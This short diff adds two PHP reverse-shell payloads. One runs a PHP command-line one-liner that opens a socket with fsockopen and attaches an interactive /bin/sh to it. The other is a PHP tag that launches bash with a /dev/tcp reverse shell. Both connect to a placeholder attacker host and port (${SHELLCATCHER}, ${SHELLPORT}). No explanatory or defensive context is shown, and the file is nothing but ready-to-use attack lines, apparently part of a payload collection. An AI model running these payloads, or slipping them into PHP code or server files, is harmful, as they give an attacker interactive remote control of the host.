@@ -1,0 +1,3 @@
+php -r '$sock=fsockopen("${SHELLCATCHER}",${SHELLPORT});exec("/bin/sh -i <&3 >&3 2>&3");'
+
+<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/${SHELLCATCHER}/${SHELLPORT} 0>&1'");?>
